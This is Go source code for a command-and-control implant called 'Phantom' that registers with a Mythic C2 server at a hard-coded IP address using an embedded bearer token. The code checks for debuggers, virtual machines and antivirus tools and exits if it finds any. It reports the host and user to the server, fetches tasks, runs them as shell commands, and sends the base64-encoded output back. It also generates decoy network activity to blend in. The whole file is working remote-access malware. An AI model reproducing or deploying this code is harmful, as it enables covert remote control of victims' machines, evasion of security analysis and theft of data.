package main

import (
        "bytes"
        "crypto/tls"
        "encoding/base64"
        "encoding/json"
        "fmt"
        "io"
        "math/rand"
        "net/http"
        "os"
        "os/exec"
        "runtime"
        "strings"
        "time"
)

const (
        mythicURL = "https://37.27.249.191:7443"
        graphqlEndpoint = "/graphql/"
        jwtToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTAxMTExMDUsImlhdCI6MTc1MDA5NjcwNSwidXNlcl9pZCI6MSwiYXV0aCI6ImFwaSIsImV2ZW50c3RlcGluc3RhbmNlX2lkIjowLCJhcGl0b2tlbnNfaWQiOjcsIm9wZXJhdGlvbl9pZCI6MH0.3VtxYzD2_mGCV4NbggbmNXpq2tEfjvwnRypraq_yBlw"
        userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
)

type GraphQLRequest struct {
        Query     string                 `json:"query"`
        Variables map[string]interface{} `json:"variables"`
}

type GraphQLResponse struct {
        Data   map[string]interface{} `json:"data"`
        Errors []interface{}          `json:"errors"`
}

type CheckinPayload struct {
        IP           string `json:"ip"`
        OS           string `json:"os"`
        User         string `json:"user"`
        Host         string `json:"host"`
        PID          int    `json:"pid"`
        UUID         string `json:"uuid"`
        Architecture string `json:"architecture"`
        PayloadType  string `json:"payload_type_name"`
        C2Profile    string `json:"c2_profile_name"`
        Description  string `json:"description"`
}

func writeLog(message string) {
        timestamp := time.Now().Format("2006-01-02 15:04:05")
        logFile, err := os.OpenFile("phantom_jwt.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
        if err != nil {
                return
        }
        defer logFile.Close()
        logFile.WriteString(fmt.Sprintf("[%s] %s\n", timestamp, message))
}

func DetectHostileEnvironment() bool {
        writeLog("Starting environment detection...")
        
        hostileProcesses := []string{
                "ollydbg", "x64dbg", "windbg", "ida", "ida64", "wireshark", "tcpview",
                "regmon", "filemon", "procmon", "vmware", "virtualbox", "vbox", "qemu",
                "sandboxie", "cuckoo", "anubis", "threat", "joebox", "comodo", "sunbelt",
                "avp", "avast", "kaspersky", "norton", "mcafee", "malwarebytes", "defender",
        }
        
        for _, proc := range hostileProcesses {
                cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s.exe", proc))
                if output, err := cmd.Output(); err == nil {
                        if strings.Contains(strings.ToLower(string(output)), proc) {
                                writeLog(fmt.Sprintf("Hostile process detected: %s", proc))
                                return true
                        }
                }
        }
        
        cmd := exec.Command("wmic", "computersystem", "get", "manufacturer")
        if output, err := cmd.Output(); err == nil {
                manufacturer := strings.ToLower(string(output))
                writeLog(fmt.Sprintf("System manufacturer: %s", manufacturer))
                vmStrings := []string{"vmware", "virtualbox", "vbox", "qemu", "xen", "parallels", "microsoft corporation", "innotek"}
                for _, vm := range vmStrings {
                        if strings.Contains(manufacturer, vm) {
                                writeLog(fmt.Sprintf("VM detected: %s", vm))
                                return true
                        }
                }
        }
        
        writeLog(fmt.Sprintf("CPU count: %d", runtime.NumCPU()))
        if runtime.NumCPU() < 2 {
                writeLog("Insufficient CPU cores detected")
                return true
        }
        
        writeLog("Environment check passed")
        return false
}

func createHTTPClient() *http.Client {
        return &http.Client{
                Transport: &http.Transport{
                        TLSClientConfig: &tls.Config{
                                InsecureSkipVerify: true,
                                ServerName:         "",
                        },
                },
                Timeout: 30 * time.Second,
        }
}

func performGraphQLRequest(query string, variables map[string]interface{}) (*GraphQLResponse, error) {
        writeLog(fmt.Sprintf("Executing GraphQL query: %s", query))
        
        request := GraphQLRequest{
                Query:     query,
                Variables: variables,
        }
        
        jsonData, err := json.Marshal(request)
        if err != nil {
                writeLog(fmt.Sprintf("JSON marshal error: %s", err.Error()))
                return nil, err
        }
        
        writeLog(fmt.Sprintf("Request payload: %s", string(jsonData)))
        
        client := createHTTPClient()
        url := mythicURL + graphqlEndpoint
        
        req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
        if err != nil {
                writeLog(fmt.Sprintf("Request creation error: %s", err.Error()))
                return nil, err
        }
        
        req.Header.Set("Content-Type", "application/json")
        req.Header.Set("User-Agent", userAgent)
        req.Header.Set("Authorization", "Bearer "+jwtToken)
        req.Header.Set("Accept", "application/json")
        
        writeLog(fmt.Sprintf("Sending request to: %s", url))
        
        resp, err := client.Do(req)
        if err != nil {
                writeLog(fmt.Sprintf("HTTP request error: %s", err.Error()))
                return nil, err
        }
        defer resp.Body.Close()
        
        body, err := io.ReadAll(resp.Body)
        if err != nil {
                writeLog(fmt.Sprintf("Response read error: %s", err.Error()))
                return nil, err
        }
        
        writeLog(fmt.Sprintf("Response status: %d", resp.StatusCode))
        writeLog(fmt.Sprintf("Response body: %s", string(body)))
        
        if resp.StatusCode != 200 {
                return nil, fmt.Errorf("HTTP error: %d - %s", resp.StatusCode, string(body))
        }
        
        var graphqlResp GraphQLResponse
        if err := json.Unmarshal(body, &graphqlResp); err != nil {
                writeLog(fmt.Sprintf("JSON unmarshal error: %s", err.Error()))
                return nil, err
        }
        
        if len(graphqlResp.Errors) > 0 {
                writeLog(fmt.Sprintf("GraphQL errors: %v", graphqlResp.Errors))
                return nil, fmt.Errorf("GraphQL errors: %v", graphqlResp.Errors)
        }
        
        writeLog("GraphQL request successful")
        return &graphqlResp, nil
}

func RegisterWithMythic() error {
        writeLog("Starting Mythic registration via GraphQL...")
        
        hostname, _ := os.Hostname()
        uuid := fmt.Sprintf("phantom-%d-%s", time.Now().Unix(), hostname)
        
        writeLog(fmt.Sprintf("Generated UUID: %s", uuid))
        writeLog(fmt.Sprintf("Hostname: %s", hostname))
        writeLog(fmt.Sprintf("Username: %s", os.Getenv("USERNAME")))
        
        payload := CheckinPayload{
                IP:           "127.0.0.1",
                OS:           runtime.GOOS,
                User:         os.Getenv("USERNAME"),
                Host:         hostname,
                PID:          os.Getpid(),
                UUID:         uuid,
                Architecture: runtime.GOARCH,
                PayloadType:  "phantom",
                C2Profile:    "HTTP",
                Description:  "Phantom C2 Agent",
        }
        
        query := `mutation createCallback($newCallback: newCallbackConfig!, $payloadUuid: String!) {
                createCallback(newCallback: $newCallback, payloadUuid: $payloadUuid) {
                        status
                        error
                }
        }`
        
        variables := map[string]interface{}{
                "newCallback": map[string]interface{}{
                        "ip":          payload.IP,
                        "host":        payload.Host,
                        "user":        payload.User,
                        "description": payload.Description,
                        "domain":      "",
                        "externalIp":  payload.IP,
                        "extraInfo":   fmt.Sprintf("OS:%s ARCH:%s PID:%d", payload.OS, payload.Architecture, payload.PID),
                        "processName": "explorer.exe",
                        "sleepInfo":   "5s",
                },
                "payloadUuid": payload.UUID,
        }
        
        resp, err := performGraphQLRequest(query, variables)
        if err != nil {
                writeLog(fmt.Sprintf("Registration failed: %s", err.Error()))
                return err
        }
        
        writeLog("Registration successful")
        writeLog(fmt.Sprintf("Response data: %v", resp.Data))
        return nil
}

func GetMythicTasks() ([]string, error) {
        writeLog("Checking for tasks via GraphQL...")
        
        hostname, _ := os.Hostname()
        uuid := fmt.Sprintf("phantom-%d-%s", time.Now().Unix(), hostname)
        
        query := `query getCallbackTasks($agent_callback_id: String!) {
                callback(where: {agent_callback_id: {_eq: $agent_callback_id}}) {
                        id
                        agent_callback_id
                        tasks(where: {status: {_eq: "submitted"}}) {
                                id
                                command_name
                                params
                                status
                        }
                }
        }`
        
        variables := map[string]interface{}{
                "agent_callback_id": uuid,
        }
        
        resp, err := performGraphQLRequest(query, variables)
        if err != nil {
                writeLog(fmt.Sprintf("Task retrieval failed: %s", err.Error()))
                return nil, err
        }
        
        var tasks []string
        
        if callbacks, ok := resp.Data["callbacks"].([]interface{}); ok {
                for _, callback := range callbacks {
                        if callbackMap, ok := callback.(map[string]interface{}); ok {
                                if taskList, ok := callbackMap["tasks"].([]interface{}); ok {
                                        for _, task := range taskList {
                                                if taskMap, ok := task.(map[string]interface{}); ok {
                                                        command := fmt.Sprintf("%v", taskMap["command_name"])
                                                        params := fmt.Sprintf("%v", taskMap["parameters"])
                                                        taskID := fmt.Sprintf("%v", taskMap["id"])
                                                        
                                                        taskStr := fmt.Sprintf("id:%s;cmd:%s;params:%s", taskID, command, params)
                                                        tasks = append(tasks, taskStr)
                                                        writeLog(fmt.Sprintf("Found task: %s", taskStr))
                                                }
                                        }
                                }
                        }
                }
        }
        
        return tasks, nil
}

func ExecuteCommand(command string) string {
        writeLog(fmt.Sprintf("Executing command: %s", command))
        
        var cmd *exec.Cmd
        
        if runtime.GOOS == "windows" {
                cmd = exec.Command("cmd", "/c", command)
        } else {
                cmd = exec.Command("sh", "-c", command)
        }
        
        output, err := cmd.Output()
        if err != nil {
                writeLog(fmt.Sprintf("Command execution error: %s", err.Error()))
                return fmt.Sprintf("Error: %s", err.Error())
        }
        
        result := string(output)
        writeLog(fmt.Sprintf("Command output: %s", result))
        return result
}

func SendTaskResponse(taskID, output string) error {
        writeLog(fmt.Sprintf("Sending task response for task ID: %s", taskID))
        
        query := `mutation updateTask($task_id: Int!, $response: String!) {
                updateTask(
                        where: {id: {_eq: $task_id}},
                        _set: {
                                status: "completed",
                                completed_time: "now()",
                                stdout: $response
                        }
                ) {
                        returning {
                                id
                                status
                        }
                }
        }`
        
        variables := map[string]interface{}{
                "task_id":  taskID,
                "response": base64.StdEncoding.EncodeToString([]byte(output)),
        }
        
        resp, err := performGraphQLRequest(query, variables)
        if err != nil {
                writeLog(fmt.Sprintf("Task response failed: %s", err.Error()))
                return err
        }
        
        writeLog("Task response sent successfully")
        writeLog(fmt.Sprintf("Response data: %v", resp.Data))
        return nil
}

func MaintainLegitimacy() {
        go func() {
                rand.Seed(time.Now().UnixNano())
                
                for {
                        sleepTime := time.Duration(300+rand.Intn(600)) * time.Second
                        time.Sleep(sleepTime)
                        
                        activities := []func(){
                                func() {
                                        cmd := exec.Command("nslookup", "microsoft.com")
                                        cmd.Run()
                                },
                                func() {
                                        cmd := exec.Command("ping", "-n", "1", "8.8.8.8")
                                        cmd.Run()
                                },
                        }
                        
                        if len(activities) > 0 {
                                activities[rand.Intn(len(activities))]()
                        }
                }
        }()
}

func main() {
        writeLog("=== PHANTOM MYTHIC JWT AGENT STARTING ===")
        writeLog(fmt.Sprintf("Running on: %s %s", runtime.GOOS, runtime.GOARCH))
        writeLog(fmt.Sprintf("Process ID: %d", os.Getpid()))
        writeLog(fmt.Sprintf("Mythic URL: %s%s", mythicURL, graphqlEndpoint))
        
        if DetectHostileEnvironment() {
                writeLog("Hostile environment detected - exiting")
                os.Exit(0)
        }
        
        writeLog("Environment check passed - proceeding")
        
        MaintainLegitimacy()
        
        // Delay inicial reduzido para debug
        delay := time.Duration(5+rand.Intn(10)) * time.Second
        writeLog(fmt.Sprintf("Initial delay: %v", delay))
        time.Sleep(delay)
        
        writeLog("Attempting Mythic registration...")
        err := RegisterWithMythic()
        if err != nil {
                writeLog(fmt.Sprintf("Registration failed: %s", err.Error()))
                time.Sleep(time.Duration(30+rand.Intn(60)) * time.Second)
        } else {
                writeLog("Registration completed successfully")
        }
        
        rand.Seed(time.Now().UnixNano())
        writeLog("Starting main loop...")
        
        for i := 0; i < 50; i++ { // Aumentado para mais iterações
                writeLog(fmt.Sprintf("Loop iteration %d", i+1))
                
                tasks, err := GetMythicTasks()
                if err == nil && len(tasks) > 0 {
                        writeLog(fmt.Sprintf("Received %d tasks", len(tasks)))
                        
                        for _, task := range tasks {
                                parts := strings.Split(task, ";")
                                if len(parts) >= 3 {
                                        taskID := strings.TrimPrefix(parts[0], "id:")
                                        command := strings.TrimPrefix(parts[1], "cmd:")
                                        
                                        if command != "" {
                                                output := ExecuteCommand(command)
                                                SendTaskResponse(taskID, output)
                                        }
                                }
                        }
                } else {
                        writeLog("No tasks received")
                }
                
                jitter := time.Duration(5+rand.Intn(10)) * time.Second
                writeLog(fmt.Sprintf("Sleeping for: %v", jitter))
                time.Sleep(jitter)
        }
        
        writeLog("Main loop completed")
}